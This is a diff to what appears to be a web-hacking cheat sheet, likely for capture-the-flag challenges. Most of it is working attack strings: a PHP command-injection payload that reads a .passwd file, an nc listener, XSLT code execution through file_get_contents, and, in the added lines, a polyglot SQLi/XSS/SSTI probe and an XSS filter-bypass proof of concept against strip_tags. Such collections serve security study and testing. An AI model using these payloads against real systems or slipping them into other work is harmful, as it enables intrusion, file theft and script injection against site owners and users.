@@ -25,6 +25,9 @@ Content types headers
 Payloads examples
 <pre>?page=../.passwd','..') === true || system("cat .passwd") || strpos('includes/index
 </pre>
+Fairly short, and will give indicators of basic SQLi, XSS and SSTI vulnerabilities
+<pre>'"&gt;&lt;svg/onload=alert()>{{7*7}}
+</pre>
 Reverse check request by nc
 <pre>nc -lvvp 1333
 </pre>
@@ -96,4 +99,16 @@ XSLT Code execution, for instance
 &#x3C;xsl:value-of select=&#x22;php:function(&#x27;file_get_contents&#x27;,&#x27;.6ff3200bee785801f420fba826ffcdee/.passwd&#x27;)&#x22;/&#x3E;
 &#x3C;/xsl:template&#x3E;
 &#x3C;/xsl:stylesheet&#x3E;
+</pre>
+
+<hr>
+<p>
+    Classical #XSS WAF Bypass<br>
+    Inline HTMLi + #PHP Strip Tags
+</p>
+Code:
+<pre>&lt;a href="&lt;?=strip_tags($_GET['url']);?&gt;"&gt;</a>
+</pre>
+PoC:
+<pre>?url="onm&lt;&gt;ouseover="ale&lt;&gt;rt(1)
 </pre>
